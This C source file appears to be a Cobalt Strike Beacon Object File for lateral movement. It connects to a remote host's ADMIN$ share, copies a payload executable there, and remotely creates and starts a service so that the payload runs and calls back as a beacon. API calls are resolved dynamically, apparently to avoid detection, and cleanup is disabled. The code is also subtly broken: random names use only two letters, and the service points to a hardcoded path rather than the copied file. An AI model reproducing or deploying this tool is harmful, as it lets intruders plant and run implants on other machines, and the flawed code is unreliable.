#include <windows.h>
#include <stdio.h>
#include "../_include/beacon.h"

// function prototypes for dynamic resolution
typedef DWORD(WINAPI *WNETADDCONNECTION2A)(LPNETRESOURCEA, LPCSTR, LPCSTR, DWORD);
typedef BOOL(WINAPI *COPYFILEA)(LPCSTR, LPCSTR, BOOL);
typedef SC_HANDLE(WINAPI *OPENSCMANAGERA)(LPCSTR, LPCSTR, DWORD);
typedef SC_HANDLE(WINAPI *CREATESERVICEA)(SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
typedef BOOL(WINAPI *STARTSERVICEA)(SC_HANDLE, DWORD, LPCSTR *);
typedef BOOL(WINAPI *DELETESERVICE)(SC_HANDLE);
typedef BOOL(WINAPI *CLOSESERVICEHANDLE)(SC_HANDLE);
typedef DWORD(WINAPI *GETLASTERROR)();
typedef int(__cdecl *SNPRINTF)(char *, size_t, const char *, ...);
typedef BOOLEAN (WINAPI* RTLGENRANDOM)(PVOID, ULONG); 

void generateRandomString(char *buffer, int length)
{
    // Max length is 256 bytes for now
    char randomBytes[256];

    // TODO: move to global variables instead
    RTLGENRANDOM pRtlGenRandom = (RTLGENRANDOM)GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction036");
    if (!pRtlGenRandom || !pRtlGenRandom(randomBytes, 256))
    {
        BeaconPrintf(CALLBACK_ERROR, "RtlGenRandom failed");
        return;
    }

    // Convert bytes to A-Z
    for (int i = 0; i < length; i++)
    {
        unsigned char val = randomBytes[i] % 2;
        buffer[i] = 'A' + val;
    }
    buffer[length] = '\0';
}

void go(char *args, int len)
{
    char *target, *localPath;

    // Parse arguments
    datap parser;
    BeaconDataParse(&parser, args, len);

    localPath = BeaconDataExtract(&parser, NULL);
    target = BeaconDataExtract(&parser, NULL);

    // Dynamically resolve APIs
    HMODULE hMpr = LoadLibraryA("mpr.dll");
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    HMODULE hMsvcrt = LoadLibraryA("msvcrt.dll");

    WNETADDCONNECTION2A pWNetAddConnection2A = (WNETADDCONNECTION2A)GetProcAddress(hMpr, "WNetAddConnection2A");
    COPYFILEA pCopyFileA = (COPYFILEA)GetProcAddress(hKernel32, "CopyFileA");
    OPENSCMANAGERA pOpenSCManagerA = (OPENSCMANAGERA)GetProcAddress(hAdvapi32, "OpenSCManagerA");
    CREATESERVICEA pCreateServiceA = (CREATESERVICEA)GetProcAddress(hAdvapi32, "CreateServiceA");
    STARTSERVICEA pStartServiceA = (STARTSERVICEA)GetProcAddress(hAdvapi32, "StartServiceA");
    DELETESERVICE pDeleteService = (DELETESERVICE)GetProcAddress(hAdvapi32, "DeleteService");
    CLOSESERVICEHANDLE pCloseServiceHandle = (CLOSESERVICEHANDLE)GetProcAddress(hAdvapi32, "CloseServiceHandle");
    GETLASTERROR pGetLastError = (GETLASTERROR)GetProcAddress(hKernel32, "GetLastError");
    SNPRINTF pSnprintf = (SNPRINTF)GetProcAddress(hMsvcrt, "_snprintf");

    if (!pWNetAddConnection2A || !pCopyFileA || !pOpenSCManagerA || !pCreateServiceA || !pGetLastError)
    {
        BeaconPrintf(CALLBACK_ERROR, "[X] Failed to resolve critical APIs");
        return;
    }

    // 1. Connect to ADMIN$ share
    CHAR remoteName[MAX_PATH];
    pSnprintf(remoteName, sizeof(remoteName), "\\\\%s\\ADMIN$", target);

    NETRESOURCEA nr = {NULL, RESOURCETYPE_DISK, NULL, NULL, NULL, remoteName, NULL, NULL};
    if (pWNetAddConnection2A(&nr, NULL, NULL, 0) != NO_ERROR)
    {
        BeaconPrintf(CALLBACK_ERROR, "[X] Connection failed: %lu\n", pGetLastError());
        return;
    }

    // 2. Copy local payload to remote ADMIN$ (C:\Windows\Temp.exe)
    CHAR remotePath[MAX_PATH];

    char binaryName[6];
    generateRandomString(binaryName, 5);
    pSnprintf(remotePath, sizeof(remotePath), "\\\\%s\\ADMIN$\\%s.exe", target, binaryName);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Copying service binary from %s to %s\n", localPath, remotePath);

    if (!pCopyFileA(localPath, remotePath, FALSE))
    { // FALSE = overwrite existing
        // TODO: copyfilea may not work, if path uses non-ASCII letters
        BeaconPrintf(CALLBACK_ERROR, "[X] CopyFileA failed: %lu\n", pGetLastError());
        return;
    }

    // 3. Create and start service
    SC_HANDLE hSCM = pOpenSCManagerA(target, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM)
    {
        BeaconPrintf(CALLBACK_ERROR, "[X] OpenSCManagerA failed: %lu", pGetLastError());
        return;
    }

    char serviceName[9];
    char displayName[13];

    generateRandomString(serviceName, 8);
    generateRandomString(displayName, 12);

    if (!serviceName || !displayName)
    {
        BeaconPrintf(CALLBACK_ERROR, "[X] Name generation failed");
        return;
    }

    SC_HANDLE hSvc = pCreateServiceA(
        hSCM,
        serviceName, // Service name
        displayName, // Display name
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        "C:\\Windows\\Temp.exe", // Path to payload
        NULL, NULL, NULL, NULL, NULL);

    if (!hSvc)
    {
        BeaconPrintf(CALLBACK_ERROR, "[X] CreateServiceA failed: %lu", pGetLastError());
        pCloseServiceHandle(hSCM);
        return;
    }

    if (!pStartServiceA(hSvc, 0, NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "[X] StartServiceA failed: %lu", pGetLastError());
        pCloseServiceHandle(hSvc);
        pCloseServiceHandle(hSCM);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Service started, you should receive a beacon now");

    // // 4. Cleanup
    // pDeleteService(hSvc);
    // pCloseServiceHandle(hSvc);
    // pCloseServiceHandle(hSCM);
    // pDeleteFileA(remotePath);
    // pWNetCancelConnection2A(target, 0, TRUE);
}